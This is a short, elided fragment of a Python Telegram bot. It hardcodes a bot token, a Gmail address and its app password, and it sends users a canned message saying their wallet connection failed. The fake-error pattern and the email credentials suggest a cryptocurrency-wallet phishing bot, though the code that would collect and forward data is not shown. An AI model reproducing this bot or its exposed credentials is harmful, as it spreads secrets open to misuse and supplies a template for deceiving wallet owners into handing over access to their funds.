...
BOT_TOKEN = "8454604868:AAHrwFBXNkUe4KG_-5U5RkJZTkHbsIAEddM"

# === Add your email credentials here ===
EMAIL_ADDRESS = "adebayoteslim78@gmail.com"
EMAIL_PASSWORD = "aplw kfwj voey pvic"   # Gmail App Password
...
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if state:
        ...
        await update.message.chat.send_message(
            f"‼️ An error occured while connecting to {wallet_name}.\n"
            f"{error_code} failed.\n\n"
        ...
        await update.message.reply_text("ℹ️ Please choose an option first with /start.")
